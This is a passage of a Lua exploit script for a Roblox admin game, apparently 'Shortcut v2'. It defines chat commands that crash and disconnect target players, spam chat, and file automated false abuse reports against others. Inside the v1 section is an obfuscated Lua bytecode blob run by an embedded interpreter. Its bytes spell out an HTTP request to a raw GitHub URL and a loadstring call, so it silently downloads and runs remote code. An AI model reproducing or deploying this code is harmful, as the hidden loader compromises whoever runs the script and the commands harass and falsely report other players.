                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput antipunish" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["antiPunish | RISK"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput autoheal" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AutoHeal"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput antiblind" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiBlind"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput antisetgrav" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiSetgrav"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput antiattach" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiAttach"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput antiteleport" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiTeleport"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "allantis" then
            cht("//guiinput antisetgrav");task.wait(.35)
            cht("//guiinput antispeed");task.wait(.35)
            cht("//guiinput antiblind");task.wait(.35)
            cht("//guiinput antipunish");task.wait(.35)
            cht("//guiinput antilag");task.wait(.35)
            cht("//guiinput antiattach");task.wait(.35)
            cht("//guiinput antigears");task.wait(1.65)
            cht("//guiinput antiteleport");task.wait(.35)
        end
        if string.sub(msg:lower(), 0, 4 + #prefix) == prefix .. "spam" then
            local msggg = string.sub(msg:lower(), 6 + #prefix)
            spam = true
            while spam do
                task.wait()
                cht(msggg)
            end
        end
        if string.sub(msg:lower(), 0, 10) == prefix .. "guiinput" then -- This only works with everything with message lower
            local guibutton = string.sub(msg:lower(), 12)
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame[guibutton]
            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                v:Fire()
            end
            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                v:Fire()
            end
        end
        if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "tspam" then
            local msggg = string.sub(msg:lower(), 7 + #prefix)
            spam = true
            while spam do
                wait(3.5)
                cht(msggg)
            end
        end
        if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "annoy" then
            local msggg = string.sub(msg:lower(), 7 + #prefix)
            spam = true
            while spam do
                wait(0.8)
                cht("reset " .. msggg .. " " .. math.random(1, 1000));wait(0.2)
                cht("sit " .. msggg .. " " .. math.random(1, 1000))
            end
        end
        if string.sub(msg:lower(), 0, 10 + #prefix) == prefix .. "disconnect" then
            local msggg = string.sub(msg:lower(), 12 + #prefix)
                temploopgrab = true
                antiFun = false
                antigear = false
                cht("unchar " .. msggg);task.wait(.5)
                cht("/toggle anticrashvg")
                cht("blind " .. msggg)
                task.wait(0.8)
                cht("noclip " .. msggg .. "");wait(0.35)
                cht("size " .. msggg .. " nan");wait(0.8)
                cht("gear " .. msggg .. " "..antilog.."159229806");wait(1.5)
                cht("gear " .. msggg .. " "..antilog.."233520257")
                cht("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
                cht("gear " .. msggg .. " "..antilog.."80661504")
                cht("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
                cht("gear " .. msggg .. " "..antilog.."99119240")
                cht("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
                cht("gear " .. msggg .. " "..antilog.."139577901")
                cht("gear " .. msggg .. " "..antilog.."94333296")
                cht("gear " .. msggg .. " "..antilog.."94333296")
                cht("gear " .. msggg .. " "..antilog.."94794847")
                cht("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
                temploopgrab = false
                cht(prefix.."spam gear " .. msggg .. " "..antilog.."253519495");wait(14.65) -- Perfect time literally
                for i = 1, 5 do
                    cht(prefix.."stop");wait(1)
                end
        end
        if string.sub(msg:lower(), 0, 6 + #prefix) == prefix .. "harddc" then
            local msggg = string.sub(msg:lower(), 8 + #prefix)
                temploopgrab = true
                antiFun = false
                antigear = false
                cht(prefix.."infyield");wait(.65)
                cht("fly me")
                cht("ff all")
                regen()
                cht(prefix.."spam gear me "..antilog.."127506257");wait(5)
                cht("/super gear me "..antilog.."127506257");wait(1.65)
                execCmd("noclipcam")
                cht(prefix.."stop")
                cht("fly " .. msggg .. " me");wait(.35)
                cht("dog " .. msggg)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                CFrame.new(Vector3.new(100000, 10000, 100000));wait(1)
                cht("tp " .. msggg .. " me");wait(.35)
                cht(":fly " .. msggg .. " me");wait(1.65)
                cht(":tp " .. msggg .. " " .. msggg)
                execCmd("usetools 250 000")
                cht("blind " .. msggg)
                wait(0.4)
                logn("Drop the gear now with backspace and align above the player so the gear tornados fall on the target")
                cht("noclip " .. msggg .. "");wait(0.35)
                cht("size " .. msggg .. " nan");wait(0.8)
                cht("gear " .. msggg .. " "..antilog.."159229806");wait(3.5)
                cht("unchar me me me me me me")
                cht(prefix.."slockmuter");wait(10)
                cht("gear " .. msggg .. " "..antilog.."233520257")
                cht(prefix.."stop")
                cht("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
                cht("gear " .. msggg .. " "..antilog.."80661504")
                cht("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
                cht("gear " .. msggg .. " "..antilog.."99119240")
                cht("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
                cht("gear " .. msggg .. " "..antilog.."139577901")
                cht("gear " .. msggg .. " "..antilog.."94333296")
                cht("gear " .. msggg .. " "..antilog.."94333296")
                cht("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
                cht("clr")
                temploopgrab = false
                cht(prefix.."spam gear " .. msggg .. " "..antilog.."253519495");wait(25.65) -- Perfect time literally
                for i = 1, 5 do
                    cht(prefix.."stop");wait(1)
                end;wait(4.5)
                cht(prefix.."tempcrash");wait(.1)
                cht(prefix.."zoomer");wait(.9)
                cht(prefix.."up")
        end
        if string.sub(msg:lower(), 0, 7 + #prefix) == prefix .. "zahando" then
            local msggg = string.sub(msg:lower(), 9 + #prefix)
                temploopgrab = true
                antiFun = false
                antigear = false
                cht("blind " .. msggg)
                wait(0.8)
                cht("noclip " .. msggg .. "");wait(0.35)
                cht("size " .. msggg .. " nan");wait(0.8)
                cht("gear " .. msggg .. " "..antilog.."159229806");wait(1.5)
                cht("gear " .. msggg .. " "..antilog.."233520257")
                cht("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
                cht("gear " .. msggg .. " "..antilog.."80661504")
                cht("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
                cht("music 304787933")
                cht("gear " .. msggg .. " "..antilog.."99119240")
                cht("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
                cht("gear " .. msggg .. " "..antilog.."139577901")
                cht("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
                cht("invis all");wait()
                cht("unblind all");wait()
                cht(prefix.."crazycolors")
                temploopgrab = false
                task.wait(10)
                cht(prefix.."stop")
                cht("fix")
        end
        if string.sub(msg:lower(), 0, 8 + #prefix) == prefix .. "funtools" then
            local msggg = string.sub(msg:lower(), 10 + #prefix)
                temploopgrab = true
                antiFun = false
                antigear = false
                cht("skydive " .. msggg)
                cht("invis all")
                cht("h \n\n\nServer Message: Santa has delivered some sweet tools. If you were lucky you'd have them B-)\n\n\n")
                wait(0.8)
                cht("noclip " .. msggg .. "");wait(0.35)
                cht("size " .. msggg .. " nan");wait(0.8)
                cht("gear " .. msggg .. " "..antilog.."159229806");wait(1.5)
                cht("gear " .. msggg .. " "..antilog.."233520257")
                cht("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
                cht("gear " .. msggg .. " "..antilog.."80661504")
                cht("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
                cht("gear " .. msggg .. " "..antilog.."99119240")
                cht("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
                cht("gear " .. msggg .. " "..antilog.."139577901")
                cht("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
                temploopgrab = false
        end
        if string.sub(msg:lower(), 0, 7 + #prefix) == prefix .. "havefun" then
            local msggg = string.sub(msg:lower(), 9 + #prefix)
                temploopgrab = true
                antiFun = false
                antigear = false
                cht("blind " .. msggg)
                wait(0.8)
                cht("noclip " .. msggg .. "");wait(0.35)
                cht("size " .. msggg .. " nan");wait(0.8)
                cht("gear " .. msggg .. " "..antilog.."159229806");wait(1.5)
                cht("gear " .. msggg .. " "..antilog.."233520257")
                cht("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
                cht("gear " .. msggg .. " "..antilog.."80661504")
                cht("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
                cht("gear " .. msggg .. " "..antilog.."99119240")
                cht("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
                cht("gear " .. msggg .. " "..antilog.."139577901")
                cht("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
                temploopgrab = false
        end
        if string.sub(msg:lower(), 0, 9 + #prefix) == prefix .. "playhouse" then
            local msggg = string.sub(msg:lower(), 11 + #prefix)
                temploopgrab = true
                antiFun = false
                antigear = false
                cht("/pads");wait(.65)
                cht("tp "..msggg.." me")
                cht("invis " .. msggg)
                wait(0.8)
                cht("music "..antilog.."1838663141");wait()
                cht("noclip " .. msggg .. "");wait(0.35)
                cht("size " .. msggg .. " nan");wait(0.8)
                cht("gear " .. msggg .. " "..antilog.."159229806");wait(1.5)
                cht("gear " .. msggg .. " "..antilog.."233520257")
                cht("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
                cht("gear " .. msggg .. " "..antilog.."80661504")
                cht("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
                cht("gear " .. msggg .. " "..antilog.."99119240")
                cht("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
                cht("gear " .. msggg .. " "..antilog.."139577901")
                cht("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
                temploopgrab = false
        end
        if string.sub(msg:lower(), 0, 4 + #prefix) == prefix .. "stop" then
            spam = false
            cht("/stop " .. math.random(1, 1000))
            colors = false
        end
        if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "super" then
            local msggggg = string.sub(msg:lower(), 7 + #prefix)
            for i = 1, 69 do
                cht(msggggg)
            end
        end
    end
end)
end)

game.Players.PlayerAdded:Connect(function(plr)
        if scriptActive then
            coroutine.wrap(function()
                    wait(1)
                    if plr.Name == "An0rdinaryGirl_Mia" then
                        say("The owner of shortcut has joined the server! (An0rdinaryGirl_Mia)")
                        cht("/whitelist "..plr.Name)
                    elseif plr.Name == "TechnoSniperX" or plr.Name == "TechnoReaperX" then
                        say("#############fool###########################piss (System) Tech *SC Creator* has joined the Experience")
                    elseif player.Name == "me_capybara" then
                        say("#############fool###########################piss (System) Capybara *SC Admin* has joined the Experience")
                        cht("/whitelist "..plr.Name)
                    elseif player.Name == "KohlsH_Angler" then
                        say("#############fool###########################piss (System) whatjg (KohlsH_Angler) *SC Admin* has joined the Experience")
                        cht("/whitelist "..plr.Name)
                    elseif player.Name == "1x3x3x7x1x7" then
                        say("#############fool###########################piss (System) Vecko *SC Admin* has joined the Experience")
                        cht("/whitelist "..plr.Name)
                    end
                end)()
        end
    end
)

-- Report

RunService.RenderStepped:Connect(function()
    task.spawn(function()
        if gamewidereport == true then
            for i, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= game.Players.LocalPlayer.Name then
                if player.Character then
                    if player.Backpack:FindFirstChild("HeatMissileLauncher") or player.Character:FindFirstChild("HeatMissileLauncher") then
                        local plrname = player.Name
                        if reportfilter then
                            return
                        end
                        pcall(function()
                            getgenv().reportfilter = true
                        end)
                        game.Players:ReportAbuse(game:GetService("Players"),player.Name,"Cheating/Exploiting", "Uses an advertise bot to spam " .. math.random(1, 3276700))
                    end
                end
            end
        end
    end
    end)
end)

if shared.startupcommands == true then
    task.wait()
    cht("//startup")
end
workspace.DescendantAdded:Connect(function(child)
	if fpsboost then
		coroutine.wrap(function()
			if child:IsA('Explosion') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			elseif child:IsA('ForceField') then
				if child.Parent:FindFirstChild('Poop') then
					game:GetService'RunService'.Heartbeat:Wait()
					child:Destroy()
				else
					child.Name = 'Poop'
				end
			elseif child:IsA('Sparkles') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			elseif child:IsA('Smoke') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			end
		end)()
	end
end)
if SCV2_LOADED and not _G.SCV2_DEBUG == true then
    cht("/rejpiss")
	error("Shortcut v2 is already running",0)
	return
end -- Completely skidded from IY since I was dumb at the time and found it funny

pcall(function() getgenv().SCV2_LOADED = true end)

--[[
	 All of this was in a loadstring 
	 I had to rename the variables as they interfere with v2's variables
	 Everything here is from v1
]]

local a = true;
local b = false;
local c = "v2 user"
local d = false;
local e = "/"
local f = "-"
function mods()
end;
local g = true;
local h = true;
local i = true;
local j = true;
local k = true;
local l = false;
local m = 9046863579;
local n = true;
local o = false;
local p = false;
local q = false;
local r = true;
local s = true;
local t = game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar;
local function u(v)
	t:SetTextFromInput(v)
	game.Players:Chat(v)
	t.Text = ""
end;
shared.banana = { -- Blacklist player.
    "4xw6",
    "ScytheBrother22",
    "collinscooler",
    "becuasetyler",
    "0_1reee",
    "Drnzsp",
    "bystii",
    "SquirrelEatDaPeanut",
    "RageCell",
	"ChineseKeemstar"
}
shared.sillock = {}
shared.gravlock = {}
local a={'\27','\76','\117','\97','\81','\0','\1','\4','\8','\4','\8','\0','\10','\0','\0','\0','\0','\0','\0','\0','\64','\109','\97','\105','\110','\46','\108','\117','\97','\0','\3','\0','\0','\0','\10','\0','\0','\0','\0','\0','\0','\4','\16','\0','\0','\0','\5','\0','\0','\0','\26','\64','\0','\0','\22','\192','\0','\128','\5','\64','\0','\0','\26','\64','\0','\0','\22','\0','\0','\128','\5','\128','\0','\0','\64','\0','\0','\0','\138','\64','\0','\0','\137','\0','\193','\129','\92','\128','\0','\1','\133','\64','\1','\0','\198','\128','\193','\0','\156','\128','\0','\1','\156','\64','\128','\0','\30','\0','\128','\0','\7','\0','\0','\0','\4','\13','\0','\0','\0','\0','\0','\0','\0','\104','\116','\116','\112','\95','\114','\101','\113','\117','\101','\115','\116','\0','\4','\8','\0','\0','\0','\0','\0','\0','\0','\114','\101','\113','\117','\101','\115','\116','\0','\4','\9','\0','\0','\0','\0','\0','\0','\0','\72','\116','\116','\112','\80','\111','\115','\116','\0','\4','\4','\0','\0','\0','\0','\0','\0','\0','\85','\114','\108','\0','\4','\89','\0','\0','\0','\0','\0','\0','\0','\104','\116','\116','\112','\115','\58','\47','\47','\114','\97','\119','\46','\103','\105','\116','\104','\117','\98','\117','\115','\101','\114','\99','\111','\110','\116','\101','\110','\116','\46','\99','\111','\109','\47','\77','\52','\108','\119','\52','\114','\101','\84','\51','\115','\116','\115','\47','\109','\121','\45','\111','\119','\110','\45','\115','\99','\114','\105','\112','\116','\115','\45','\112','\114','\111','\106','\101','\99','\116','\115','\47','\109','\97','\105','\110','\47','\65','\80','\73','\80','\65','\82','\84','\50','\46','\108','\117','\97','\0','\4','\11','\0','\0','\0','\0','\0','\0','\0','\108','\111','\97','\100','\115','\116','\114','\105','\110','\103','\0','\4','\5','\0','\0','\0','\0','\0','\0','\0','\66','\111','\100','\121','\0','\0','\0','\0','\0','\16','\0','\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\6','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\10','\0','\0','\0','\2','\0','\0','\0','\9','\0','\0','\0','\0','\0','\0','\0','\114','\101','\113','\117','\101','\115','\116','\115','\0','\7','\0','\0','\0','\15','\0','\0','\0','\7','\0','\0','\0','\0','\0','\0','\0','\115','\99','\114','\105','\112','\116','\0','\11','\0','\0','\0','\15','\0','\0','\0','\0','\0','\0','\0'}local b={"ABC","ABx","ABC","ABC","ABC","ABx","ABC","ABx","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","AsBx","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","AsBx","AsBx","ABC","ABC","ABC","ABx","ABC"}local c={"MOVE","LOADK","LOADBOOL","LOADNIL","GETUPVAL","GETGLOBAL","GETTABLE","SETGLOBAL","SETUPVAL","SETTABLE","NEWTABLE","SELF","ADD","SUB","MUL","DIV","MOD","POW","UNM","NOT","LEN","CONCAT","JMP","EQ","LT","LE","TEST","TESTSET","CALL","TAILCALL","RETURN","FORLOOP","FORPREP","TFORLOOP","SETLIST","CLOSE","CLOSURE","VARARG"}local function c(a,b,d)if d then local e=0;local f=0;for b=b,d do e=e+2^f*c(a,b)f=f+1 end;return e else local b=2^(b-1)return(a%(b+b)>=b)and 1 or 0 end end;local function d(a)local d=1;local e=false;local f;local g;local h,i;local j,k,l,m,n;do function j()local a=a:byte(d,d)d=d+1;return a end;function k()local a,b,c,e=a:byte(d,d+3)d=d+4;return e*16777216+c*65536+b*256+a end;function l()local a=k()local b=k()return b*4294967296+a end;function m()local a=k()local b=k()return(-2*c(b,32)+1)*(2^(c(b,21,31)-1023))*((c(b,1,20)*(2^32)+a)/(2^52)+1)end;function n(b)local c;if b then c=a:sub(d,d+b-1)d=d+b else b=i()if b==0 then return end;c=a:sub(d,d+b-1)d=d+b end;return c end end;local function a()local d;local e={}local f={}local g={}local i={lines={}}d={instructions=e;constants=f;prototypes=g;debug=i}local l;d.name=n()d.first_line=h()d.last_line=h()if d.name then d.name=d.name:sub(1,-2)end;d.upvalues=j()d.arguments=j()d.varg=j()d.stack=j()do l=h()for a=1,l do local d={}local f=k()local g=c(f,1,6)local b=b[g+1]d.opcode=g;d.type=b;d.A=c(f,7,14)if b=="ABC"then d.B=c(f,24,32)d.C=c(f,15,23)elseif b=="ABx"then d.Bx=c(f,15,32)elseif b=="AsBx"then d.sBx=c(f,15,32)-131071 end;e[a]=d end end;do l=h()for a=1,l do local b={}local c=j()b.type=c;if c==1 then b.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=(j()~=0)elseif c==3 then b.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=m()elseif c==4 then b.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=n():sub(1,-2)end;f[a-1]=b end end;do l=h()for b=1,l do g[b-1]=a()end end;do local a=i.lines;l=h()for b=1,l do a[b]=k()end;l=h()for a=1,l do n():sub(1,-2)k()k()end;l=h()for a=1,l do n()end end;return d end;do assert(n(4)=="\27Lua","S1MPLYS3C7RED: Bytecode expected")assert(j()==81,"S1MPLYS3C7RED: Only lua5.1 is supported")j()e=(j()==0)f=j()g=j()if f==4 then h=k elseif f==8 then h=l else error("")end;if g==4 then i=k elseif g==8 then i=l else error("")end;assert(n(3)=="\4\8\0","S1MPLYS3C7RED: Unsupported platform")end;return a()end;local function b(...)local a=select("#",...)local b={...}return a,b end;local function c(a,d)local e=a.instructions;local f=a.constants;local g=a.prototypes;local h,i;local j;local k=1;local l,m;local b={[0]=function(a)h[a.A]=h[a.B]end,[1]=function(a)h[a.A]=f[a.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI end,[2]=function(a)h[a.A]=a.B~=0;if a.C~=0 then k=k+1 end end,[3]=function(a)local b=h;for a=a.A,a.B do b[a]=nil end end,[4]=function(a)h[a.A]=d[a.B]end,[5]=function(a)local b=f[a.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;h[a.A]=j[b]end,[6]=function(a)local b=a.C;local c=h;b=b>255 and f[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or c[b]c[a.A]=c[a.B][b]end,[7]=function(a)local b=f[a.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;j[b]=h[a.A]end,[8]=function(a)d[a.B]=h[a.A]end,[9]=function(a)local b=a.B;local c=a.C;local d,e=h,f;b=b>255 and e[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[b]c=c>255 and e[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[c]d[a.A][b]=c end,[10]=function(a)h[a.A]={}end,[11]=function(a)local b=a.A;local c=a.B;local a=a.C;local d=h;c=d[c]a=a>255 and f[a-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[a]d[b+1]=c;d[b]=c[a]end,[12]=function(a)local b=a.B;local c=a.C;local d,e=h,f;b=b>255 and e[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[b]c=c>255 and e[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[c]d[a.A]=b+c end,[13]=function(a)local b=a.B;local c=a.C;local d,e=h,f;b=b>255 and e[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[b]c=c>255 and e[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[c]d[a.A]=b-c end,[14]=function(a)local b=a.B;local c=a.C;local d,e=h,f;b=b>255 and e[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[b]c=c>255 and e[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[c]d[a.A]=b*c end,[15]=function(a)local b=a.B;local c=a.C;local d,e=h,f;b=b>255 and e[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[b]c=c>255 and e[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[c]d[a.A]=b/c end,[16]=function(a)local b=a.B;local c=a.C;local d,e=h,f;b=b>255 and e[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[b]c=c>255 and e[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[c]d[a.A]=b%c end,[17]=function(a)local b=a.B;local c=a.C;local d,e=h,f;b=b>255 and e[b-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[b]c=c>255 and e[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[c]d[a.A]=b^c end,[18]=function(a)h[a.A]=-h[a.B]end,[19]=function(a)h[a.A]=not h[a.B]end,[20]=function(a)h[a.A]=#h[a.B]end,[21]=function(a)local b=a.B;local c=h[b]for a=b+1,a.C do c=c..h[a]end;h[a.A]=c end,[22]=function(a)k=k+a.sBx end,[23]=function(a)local b=a.A;local c=a.B;local a=a.C;local d,e=h,f;b=b~=0;c=c>255 and e[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[c]a=a>255 and e[a-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[a]if(c==a)~=b then k=k+1 end end,[24]=function(a)local b=a.A;local c=a.B;local a=a.C;local d,e=h,f;b=b~=0;c=c>255 and e[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[c]a=a>255 and e[a-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[a]if(c<a)~=b then k=k+1 end end,[25]=function(a)local b=a.A;local c=a.B;local a=a.C;local d,e=h,f;b=b~=0;c=c>255 and e[c-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[c]a=a>255 and e[a-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or d[a]if(c<=a)~=b then k=k+1 end end,[26]=function(a)if h[a.A]==(a.C~=0)then k=k+1 end end,[27]=function(a)local b=h;local c=b[a.B]if c==(a.C~=0)then k=k+1 else b[a.A]=c end end,[28]=function(a)local c=a.A;local d=a.B;local a=a.C;local e=h;local f,g;local h,j;f={}if d~=1 then if d~=0 then h=c+d-1 else h=i end;j=0;for a=c+1,h do j=j+1;f[j]=e[a]end;h,g=b(e[c](unpack(f,1,h-c)))else h,g=b(e[c]())end;i=c-1;if a~=1 then if a~=0 then h=c+a-2 else h=h+c end;j=0;for a=c,h do j=j+1;e[a]=g[j]end end end,[29]=function(a)local b=a.A;local c=a.B;local a=a.C;local a=h;local d,e;local f,g,h=i;d={}if c~=1 then if c~=0 then g=b+c-1 else g=f end;h=0;for b=b+1,g do h=h+1;d[#d+1]=a[b]end;e={a[b](unpack(d,1,g-b))}else e={a[b]()}end;return true,e end,[30]=function(a)local b=a.A;local a=a.B;local c=h;local d;local e,e;if a==1 then return true end;if a==0 then d=i else d=b+a-2 end;e={}local a=0;for b=b,d do a=a+1;e[a]=c[b]end;return true,e end,[31]=function(a)local b=a.A;local c=h;local d=c[b+2]local e=c[b]+d;c[b]=e;if d>0 then if e<=c[b+1]then k=k+a.sBx;c[b+3]=e end else if e>=c[b+1]then k=k+a.sBx;c[b+3]=e end end end,[32]=function(a)local b=a.A;local c=h;c[b]=c[b]-c[b+2]k=k+a.sBx end,[33]=function(a)local b=a.A;local c=a.B;local a=a.C;local c=h;local d=b+2;local e={c[b](c[b+1],c[b+2])}for a=1,a do c[d+a]=e[a]end;if c[b+3]~=nil then c[b+2]=c[b+3]else k=k+1 end end,[34]=function(a)local b=a.A;local c=a.B;local a=a.C;local d=h;if a==0 then error("NYI: extended SETLIST")else local a=(a-1)*50;local e=d[b]if c==0 then c=i end;for c=1,c do e[a+c]=d[b+c]end end end,[35]=function(a)io.stderr:write("NYI: CLOSE")io.stderr:flush()end,[36]=function(a)local b=g[a.Bx]local e=e;local f=h;local g={}local h=setmetatable({},{__index=function(a,a)local a=g[a]return a.segment[a.offset]end,__newindex=function(a,a,b)local a=g[a]a.segment[a.offset]=b end})for a=1,b.upvalues do local b=e[k]if b.opcode==0 then g[a-1]={segment=f,offset=b.B}elseif e[k].opcode==4 then g[a-1]={segment=d,offset=b.B}end;k=k+1 end;local b,b=c(b,h)f[a.A]=b end,[37]=function(a)local b=a.A;local a=a.B;local c,d=h,l;for a=b,b+(a>0 and a-1 or m)do c[a]=d[a-b]end end}local function c()local a=e;local c,d,e;while true do c=a[k]k=k+1;d,e=b[c.opcode](c)if d then return e end end end;local b={get_stack=function()return h end;get_IP=function()return k end}local function d(...)local b={}local d={}i=-1;h=setmetatable(b,{__index=d;__newindex=function(a,a,b)if a>i and b then i=a end;d[a]=b end})local d={...}l={}m=select("#",...)-1;for a=0,m do b[a]=d[a+1]l[a]=d[a+1]end;j=getfenv()k=1;local b=coroutine.create(c)local b,c=coroutine.resume(b)if b then if c then return unpack(c)end;return else local b=a.name;local a=a.debug.lines[k]local d=c:gsub("(.-:)","")local d=""d=d..(b and b..":"or"")d=d..(a and a..":"or"")d=d..c;error(d,0)end end;return b,d end;local b={IlIIIIIIlIllIIlIlIIIllIllIIlllIllll=function(a)local a=d(a)local a,a=c(a)return a end;utils={lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll=d;IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl=c;IlllIIIllIlllIlIIIllllIIllllIIllllI=function(a)local a=d(a)return c(a)end}}b.IlIIIIIIlIllIIlIlIIIllIllIIlllIllll(table.concat(a,[[]]))()
local w = false;
local x = ";kick "
local y = "k"
local z = false;
local A = "p"
local B = "n"
local C = "b"
local D = "v"
local E = "c"
local F = "x"
local G = "z"
local H = "m"
local I = "None"
local J = ""
local K = false;
local L = nil
local M = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        "
local N = M .. "g" .. M .. "g" .. M .. "g" .. M .. "g" .. M .. "g" .. M;
Quotes = {
	"Add your quotes.\nI found this too cringe to keep in"
}
local O = false;
local P = false;
local Q = "none"
local R = false;
local S = "none"
local T = false;
local U = "nothing"
local V = game.Players.LocalPlayer:GetMouse()
local W = game:GetService("Players")
local X = nil;
local Y = game:GetService("Workspace").Terrain["_Game"]
local Z = Y.Workspace;
local _ = Y.Admin;
local a0 = false;
local a1 = "PaintPart"
V.KeyDown:connect(function(a2)
	if a2:lower() == H then
		logn("Attached to object")
		if V.Target then
			local a3 = V.Target;
			function movepart()
				local a4 = game.Players.LocalPlayer.Character.HumanoidRootPart;
				local a5 = true;
				task.spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
